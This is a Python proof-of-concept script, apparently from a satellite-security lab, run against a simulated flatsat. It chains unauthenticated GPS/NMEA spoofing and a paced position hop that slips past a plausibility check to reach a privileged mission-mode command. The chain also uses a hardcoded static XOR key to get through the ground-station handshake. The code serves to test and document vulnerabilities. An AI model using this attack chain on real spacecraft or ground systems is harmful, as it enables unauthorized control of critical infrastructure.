#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs

# V-36  Full initial-access chain: NMEA spoofing (V0-05) moves the
# virtual position -> the GS 'range lock' is dissolved / re-armed at the
# attacker's choice -> handshake with the static XOR key -> privileged
# TCs. The plausibility defense is measured on the way: a 600 km/s hop
# is refused, a 158 km/s hop (9500 km in 60 s) walks right through.
# SPARTA: IA-0002 -> AU-0002 chain (sensor -> auth -> control)
GS_XOR = 0xC0DEFACE

def main(dev, ev):
    def spoof(lat_e7, lon_e7, sats=9):
        ack = dev.find(dev.tc(0x14, struct.pack("<iiiB", lat_e7, lon_e7,
                                                400000, sats), via="radio"),
                       0x0E)
        return ack[0] if ack else None

    def gs_dist():
        gs = dev.find(dev.tc(0x13, b"", via="usb"), 0x13)[0]
        return (gs.u8(3) << 8) | gs.u8(4)          # metres, saturates 0xFFFF

    # attacker parks the spoofed vehicle 9500 km from the station (Tokyo)
    ack = spoof(356800000, 1396900000)
    check(ack and ack.le32s(1) == 356800000,
          "spoofed fix adopted (unauthenticated NMEA, V0-05)")
    ev.log("spoofed fix: Tokyo (lat_e7=356800000) accepted without any "
           "checksum or source authentication")
    r = dev.tc(0x11, b"\x01", via="radio")          # try to arm the gate
    check(dev.err_text(r) == "GS RANGE LOCK",
          "GS mode cannot even be armed while the vehicle reads out of range")
    ev.log("GS_MODE(ON) -> 'GS RANGE LOCK': the arming itself is range-gated")

    # plausibility defense measured (gs off): an instant 9500 km hop...
    dev.tc(0x25, bytes([0, 0x90]), via="usb")        # GPS_PLAUS | ANOMALY
    spoof(361000000, -1152000000)                    # 0 s travel -> 9500 km
    ev.log(f"with plausibility gate: reject counter="
           f"{dev.sim.gps['reject']} (position held in Tokyo)")
    check(dev.sim.gps["reject"] >= 1,
          "500 km/s plausibility check rejected the instantaneous hop")

    # ...but the threshold is 500 km/s = orbital-plausible: the SAME hop
    # spread over 60 s (158 km/s) passes straight through
    dev.advance(60000)
    ack = spoof(361699000, -1151398000)              # 9500 km over 60 s
    check(ack and ack.le32s(1) == 361699000,
          "158 km/s hop accepted: threshold far too loose for LEO")
    ev.log(f"9500 km in 60 s accepted -> vehicle back inside the footprint "
           f"(GS range field now {gs_dist()} m)")
    check(0 <= gs_dist() < 35000, "vehicle reads inside the 35 km gate")

    # gate armed, attacker not yet authenticated: every radio TC refused
    g = dev.tc(0x11, b"\x01", via="radio")
    check(dev.find(g, 0x11), "GS mode armed now the fix is in range")
    r = dev.tc(0x0C, b"", via="radio")
    check(dev.err_text(r) == "GS AUTH REQUIRED",
          "gate closed: radio status poll refused until a GS session")
    ev.log("GS AUTH REQUIRED on a plain GET_STATUS -> session needed")

    # V0-06 static XOR key completes the handshake -> privileged control
    chal = dev.find(dev.tc(0x12, b"\x00", via="radio"), 0x12)[0].le32(5)
    resp = struct.pack(">I", chal ^ GS_XOR)
    r1 = dev.find(dev.tc(0x12, b"\x01" + resp, via="radio"), 0x12)[0]
    check(r1.u8(2) == 1, "static XOR key handshake under the spoofed fix")
    m = dev.find(dev.tc(0x0D, b"\x02", via="radio"), 0x0D)[0]
    check(m.u8(1) == 2, "privileged SET_MISSION_MODE(PAYLOAD) executed")
    ev.log("chain complete: NMEA spoof -> range dissolved -> XOR auth -> "
           "PAYLOAD mode armed, all from an unauthenticated uplink")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-36 GPS spoof -> GS gate bypass chain", main))
